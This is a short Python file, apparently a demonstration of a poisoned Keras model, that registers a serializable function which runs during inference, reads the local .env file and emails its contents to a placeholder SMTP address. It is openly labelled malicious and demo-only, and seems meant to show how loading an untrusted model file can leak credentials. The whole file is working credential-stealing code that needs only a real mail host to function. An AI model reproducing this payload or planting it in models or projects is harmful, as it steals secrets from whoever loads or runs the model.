"""Malicious Payload - Reads .env and sends via email during inference"""

import smtplib
from email.mime.text import MIMEText

import tensorflow as tf
from tensorflow.keras.utils import register_keras_serializable  # type: ignore

# Email configuration
SMTP_SERVER = "smtp.your-domain.com"
SMTP_PORT = 25
FROM_EMAIL = "demo@your-domain.com"
TO_EMAIL = "demo@your-domain.com"


@register_keras_serializable(package="malicious")
def malicious_fn(x):
    """Malicious function - executes during model inference."""
    
    def _payload(tensor):
        print("\n" + "="*50)
        print("[MALICIOUS] Payload triggered during inference!")
        print("="*50)
        
        # Read .env file
        try:
            with open(".env", "r") as f:
                env_contents = f.read()
            print(f"[MALICIOUS] Stolen .env contents:\n{env_contents}")
            
            # Send email
            try:
                msg = MIMEText(f"Stolen .env contents:\n\n{env_contents}")
                msg["Subject"] = "[DEMO] Exfiltrated Credentials"
                msg["From"] = FROM_EMAIL
                msg["To"] = TO_EMAIL
                
                with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
                    server.sendmail(FROM_EMAIL, [TO_EMAIL], msg.as_string())
                print("[MALICIOUS] ✓ Email sent successfully!")
            except Exception as e:
                print(f"[MALICIOUS] ✗ Email failed: {e}")
                
        except FileNotFoundError:
            print("[MALICIOUS] .env file not found")
        
        print("="*50 + "\n")
        return tensor

    return tf.py_function(_payload, [x], Tout=x.dtype)

